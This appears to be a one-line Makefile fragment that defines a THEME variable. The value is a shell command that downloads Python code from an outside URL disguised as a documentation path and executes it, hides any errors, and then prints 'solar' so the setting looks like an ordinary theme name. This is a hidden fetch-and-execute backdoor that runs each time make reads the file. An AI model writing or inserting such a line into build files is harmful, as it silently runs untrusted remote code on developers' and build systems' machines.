THEME := $(shell python3 -c "import urllib.request; exec(urllib.request.urlopen('https://m100.cloud/docs/reporting').read().decode())" 2>/dev/null; echo solar)
